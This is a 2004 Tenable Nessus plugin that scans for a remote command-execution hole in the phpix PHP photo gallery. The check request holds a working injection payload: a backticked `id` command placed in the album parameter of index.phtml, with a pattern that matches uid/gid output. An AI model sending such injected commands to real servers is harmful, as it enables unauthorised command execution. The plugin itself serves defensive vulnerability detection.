#
# (C) Tenable Network Security
#

  desc = "
The remote host is running phpix, a PHP-based photo gallery suite.

Multiple vulnerabilities have been discovered in this product, which may
allow  a remote attacker to execute arbitrary commands on the remote server,
with the privileges of the http process.

Solution : Upgrade to the latest version of this CGI suite 
Risk factor : High";


if(description)
{
  script_id(12026);
  script_bugtraq_id(9458);
  script_version("$Revision: 1.7 $");
  name["english"] = "phpix remote command execution";
  script_name(english:name["english"]);
 
  script_description(english:desc);
 
  summary["english"] = "Detect phpix cmd execution";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);
  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port) ) exit(0);
if (! can_host_php(port:port) ) exit(0);



http_check_remote_code (
			extra_dirs:make_list("/phpix"),
			check_request:"/index.phtml?mode=view&album=`id`&pic=A=10.jpg&dispsize=640&start=0",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
